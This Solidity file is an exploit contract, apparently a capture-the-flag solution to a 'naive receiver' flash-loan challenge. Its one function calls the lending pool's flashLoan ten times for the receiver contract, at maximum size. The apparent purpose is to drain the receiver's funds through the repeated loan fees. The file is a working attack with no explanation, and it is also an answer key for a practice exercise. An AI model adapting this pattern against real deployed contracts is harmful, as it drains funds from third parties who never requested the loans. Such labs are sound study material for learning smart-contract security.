// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract Attack {

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function getEmBoyz(address payable receiver, address payable pool) public
    {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(FlashLoanReceiver(receiver), ETH, NaiveReceiverLenderPool(pool).maxFlashLoan(ETH), "0x");
        }
    }
}